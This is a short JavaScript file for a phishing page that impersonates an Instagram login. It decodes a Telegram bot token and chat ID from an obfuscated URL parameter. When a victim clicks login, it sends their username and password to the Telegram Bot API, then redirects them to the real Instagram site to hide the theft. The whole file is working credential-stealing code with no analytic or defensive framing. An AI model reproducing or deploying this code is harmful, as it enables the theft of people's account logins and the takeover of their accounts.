const decr=(vlu)=>{return atob(vlu)};
const val = decr(new URLSearchParams(window.location.search).get(decr('GdmFs'.slice(1))).slice(1).slice(0,-1)).split("|");

const username = document.getElementById("username");
const password = document.getElementById("password");
const login = document.getElementById("login");

login.addEventListener('click',async()=>{
    const message = `WEBSITE: INSTAGRAM \nTIME : ${new Date().toLocaleString()}\nUSERNAME : ${username.value}\nPASSWORD : ${password.value}`;
    const response = await fetch(`https://api.telegram.org/bot${val[0]}/sendMessage?chat_id=${val[1]}&text=${encodeURIComponent(message)}`)
    console.log(response.okay)
    if(response){
        window.location.href = "https://www.instagram.com/";
    }
    
});
